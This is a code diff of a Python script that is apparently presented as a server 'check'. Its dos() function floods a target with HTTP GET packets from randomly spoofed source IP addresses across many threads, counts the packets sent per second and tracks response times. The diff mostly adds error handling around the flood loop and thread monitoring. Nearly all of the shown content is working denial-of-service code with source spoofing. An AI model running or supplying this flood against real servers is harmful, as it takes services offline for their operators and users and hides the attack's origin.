@@ -12,35 +12,37 @@ global packet_list
 
 
 def dos(server_ip, server_port):
+    try:
+        # Craft an HTTP GET request packet
+        tcp_packet = TCP(dport=server_port, sport=12345)
+        get_request = (
+            "GET / HTTP/1.1\r\n"
+            "Host: {}\r\n"
+            "\r\n"
+        ).format(server_ip)
 
-    # Craft an HTTP GET request packet
-    tcp_packet = TCP(dport=server_port, sport=12345)
-    get_request = (
-        "GET / HTTP/1.1\r\n"
-        "Host: {}\r\n"
-        "\r\n"
-    ).format(server_ip)
+        global packet_list
+        idx = len(packet_list)
+        packets = 0
+        packet_list.append(packets)
+        global threads_run
+        while threads_run:
+            rand_num1 = random.randint(1, 254)
+            rand_num2 = random.randint(1, 254)
+            rand_num3 = random.randint(1, 254)
+            rand_num4 = random.randint(1, 254)
+            src_ip = f'{str(rand_num1)}.{str(rand_num2)}.{str(rand_num3)}.{str(rand_num4)}'
+            ip_packet = IP(src=src_ip, dst=server_ip)
 
-    global packet_list
-    idx = len(packet_list)
-    packets = 0
-    packet_list.append(packets)
-    global threads_run
-    while threads_run:
-        rand_num1 = random.randint(1, 254)
-        rand_num2 = random.randint(1, 254)
-        rand_num3 = random.randint(1, 254)
-        rand_num4 = random.randint(1, 254)
-        src_ip = f'{str(rand_num1)}.{str(rand_num2)}.{str(rand_num3)}.{str(rand_num4)}'
-        ip_packet = IP(src=src_ip, dst=server_ip)
+            _packet = ip_packet / tcp_packet / get_request
 
-        _packet = ip_packet / tcp_packet / get_request
+            # Send the packet
+            send(_packet, verbose=0)
 
-        # Send the packet
-        send(_packet, verbose=0)
-
-        # count packets
-        packet_list[idx] += 1
+            # count packets
+            packet_list[idx] += 1
+    except:
+        pass
 
 
 def get_response_time(server_ip, server_port, path="/"):
@@ -146,17 +148,21 @@ def execute(server_ip, server_port, num_of_threads=10, response_avgs_between_thr
                     packets_sum += packet_count
                     packet_list[idx] = 0
                 time_list[0] = time.time()
-                print(packets_sum)
-                print(time_interval)
-                output.emit(f"the number of packets per second between {thread_num-1} threads to {thread_num} threads is {packets_sum//time_interval}")
+                # print(packets_sum)
+                # print(time_interval)
+                output.emit(f"the number of packets per second between {thread_num-1} threads to {thread_num} threads is {int(packets_sum//time_interval)}")
                 packets_sum = 0
                 dos_threads[thread_num - 1].start()
                 if output:
                     output.emit(f"DoS thread number {thread_num} is running")
+                for i in range(0, thread_num-1):
+                    if not dos_threads[i].is_alive():
+                        raise Exception
             _iter += 1
 
-        except KeyboardInterrupt:
-            break
+        except:
+            output.emit("The Check stopped due to an Error")
+            return None
 
     # stop all threads
     threads_run = False
